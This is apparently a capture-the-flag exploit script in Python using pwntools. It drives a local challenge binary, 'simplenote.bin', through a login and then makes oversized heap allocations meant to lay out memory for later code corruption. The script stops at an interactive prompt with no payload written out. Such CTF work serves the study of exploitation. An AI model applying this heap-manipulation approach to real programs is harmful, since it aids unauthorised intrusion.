#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *

context.log_level = "debug"
p = process("./subler ./simplenote.bin ./flag", shell=True)

p.recvuntil("> ")

p.sendline("123456789")

p.recvuntil(": ")

p.sendline("say2\n12345")

p.recvuntil("> ")

#now loop to hell!

def alloc(size, content):

    p.sendline("1")
    p.recvuntil("> ")
    p.sendline(str(size))
    p.recvuntil("content:\n")
    p.sendline(content)
    p.recvuntil("> ")

#try to allocate a big one.

alloc(20971520-0x23f4, "saybig") #0
alloc(0xea0, "init") #1
alloc(0x2000, "a"*11) #2 modify code from here!!!

p.interactive()
